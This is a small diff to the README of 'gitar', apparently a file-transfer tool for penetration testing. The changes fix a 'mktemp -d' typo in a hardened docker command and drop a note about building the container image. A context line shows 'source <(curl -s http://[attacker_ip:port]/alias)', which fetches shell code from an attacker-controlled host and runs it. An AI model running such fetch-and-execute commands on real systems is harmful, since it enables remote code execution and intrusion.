@@ -46,10 +46,7 @@ source <(curl -s http://[attacker_ip:port]/alias)
 
 ### 🐋 Secure launch of `gitar` server
 
- 
 This is basicaly the same as launching `gitar` server. But as we expose our http server we become the prey. Hence we must harden a bit the server. To do this we launch `gitar` inside a container and use HTTPS.
-
-*To use container image, you have to built it from ` Dockerfile`: `make build.gitar.image`*
 
 The following steps expose files of current directory. Files uploaded by remote are written inside current directory also.
 
@@ -105,7 +102,7 @@ gtrclean
 
 #### 🐋 Container and bidirectional exchange
 ```shell
-BIDIR=$(mktemp-d);docker run -it --rm --cap-drop=all --cap-add=dac_override --net host --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" -v "$BIDIR:$BIDIR" ariary/gitar -bidi -bd $BIDIR
+BIDIR=$(mktemp -d);docker run -it --rm --cap-drop=all --cap-add=dac_override --net host --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" -v "$BIDIR:$BIDIR" ariary/gitar -bidi -bd $BIDIR
 ```
 
 Then on attacker machine load shortcut:
